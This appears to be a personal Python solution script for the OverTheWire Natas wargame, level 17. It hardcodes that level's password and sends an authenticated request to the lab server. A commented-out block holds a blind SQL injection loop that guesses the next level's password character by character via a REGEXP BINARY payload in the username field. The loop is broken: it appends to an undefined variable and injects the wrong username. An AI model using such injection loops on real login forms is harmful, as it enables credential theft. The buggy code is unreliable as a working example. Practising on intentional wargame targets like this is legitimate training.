#!/bin/python3
import requests
import re

user = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = 'http://%s.natas.labs.overthewire.org/' % user

sessione = requests.Session()
obj = {'username': 'natas18'}
get = sessione.get(url, data=obj, auth=(user, password))

print(get.text)

'''
query = 'natas16" and password REGEXP BINARY "^'
letter = '{}'
pass18 = ''

while True:

    for i in "abcdefghjkilmnopqrstuvxywzABCDEFGHIJKLMNOPQRSTUVXYWZ0123456789":
        r = query + letter.format(i)

        obj = {'username': r}
        post = sessione.post(url, data=obj, auth=(user, password))

        espr = re.findall("This user exists(.*)", post.text)

        if len(espr) > 0:
            query = query + i
            pass16 = pass16 + i

    if len(pass16) == 32:
        break

print(pass16)

print(get.text)
'''
